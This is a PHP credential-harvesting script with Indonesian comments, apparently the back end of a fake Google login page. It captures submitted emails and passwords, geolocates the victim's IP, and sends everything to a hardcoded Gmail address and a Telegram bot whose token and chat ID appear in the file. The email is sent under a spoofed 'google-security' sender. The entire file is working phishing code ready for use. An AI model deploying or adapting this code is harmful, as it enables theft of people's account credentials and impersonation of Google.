<?php

// ========== CONFIGURASI ==========

// Kirim ke Email?
$SEND_EMAIL = true;

// Kirim ke Telegram?
$SEND_TELEGRAM = true;

// Email tujuan
$EMAIL_TO = "yacantikmaaf@gmail.com"; // ganti emailmu

// Telegram token & chat id
$TELEGRAM_TOKEN = "7705452586:AAH8szxpWD3Ncbwv7l9cDjmW0p_Nlkzn6b8"; // ganti dengan token bot telegram kamu
$TELEGRAM_CHAT_ID = "7575536064"; // ganti dengan chat id kamu

// =================================


// Ambil data form
$email    = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

// Ambil IP user
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$user_ip = getUserIP();

// Ambil lokasi berdasarkan IP menggunakan API gratis
function getLocationFromIP($ip) {
    // Gunakan ip-api.com (gratis, tanpa API key)
    $url = "http://ip-api.com/json/{$ip}";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if ($response) {
        $data = json_decode($response, true);
        if ($data && $data['status'] == 'success') {
            return [
                'country' => $data['country'] ?? 'Unknown',
                'region' => $data['regionName'] ?? 'Unknown',
                'city' => $data['city'] ?? 'Unknown',
                'timezone' => $data['timezone'] ?? 'Unknown',
                'isp' => $data['isp'] ?? 'Unknown'
            ];
        }
    }
    
    return [
        'country' => 'Unknown',
        'region' => 'Unknown',
        'city' => 'Unknown',
        'timezone' => 'Unknown',
        'isp' => 'Unknown'
    ];
}

$location = getLocationFromIP($user_ip);

// Format pesan untuk Telegram (dengan emoji)
$telegram_message = "🔐 <b>Google Login Data</b>\n\n";
$telegram_message .= "📧 <b>Email:</b> <code>$email</code>\n";
$telegram_message .= "🔑 <b>Password:</b> <code>$password</code>\n\n";
$telegram_message .= "📍 <b>Location Info:</b>\n";
$telegram_message .= "🌍 Country: {$location['country']}\n";
$telegram_message .= "📌 City: {$location['city']}\n";
$telegram_message .= "🗺 Region: {$location['region']}\n";
$telegram_message .= "🌐 IP Address: <code>$user_ip</code>\n";
$telegram_message .= "📡 ISP: {$location['isp']}\n";
$telegram_message .= "⏰ Timezone: {$location['timezone']}\n";
$telegram_message .= "🕐 Time: " . date('Y-m-d H:i:s');

// Format pesan untuk Email (plain text)
$email_message = "Google Login - New Credential\n\n";
$email_message .= "Email: $email\n";
$email_message .= "Password: $password\n\n";
$email_message .= "=== LOCATION INFO ===\n";
$email_message .= "Country: {$location['country']}\n";
$email_message .= "City: {$location['city']}\n";
$email_message .= "Region: {$location['region']}\n";
$email_message .= "IP Address: $user_ip\n";
$email_message .= "ISP: {$location['isp']}\n";
$email_message .= "Timezone: {$location['timezone']}\n";
$email_message .= "Time: " . date('Y-m-d H:i:s');


// ========== KIRIM EMAIL ==========
if ($SEND_EMAIL && !empty($email)) {
    $subject = "Google Login - New Credential from {$location['city']}";
    $headers = "From: no-reply@google-security.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    @mail($EMAIL_TO, $subject, $email_message, $headers);
}


// ========== KIRIM TELEGRAM ==========
if ($SEND_TELEGRAM && !empty($email)) {
    $url = "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage";
    
    $data = [
        "chat_id" => $TELEGRAM_CHAT_ID,
        "text" => $telegram_message,
        "parse_mode" => "HTML"
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context  = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

// Tidak ada output
exit();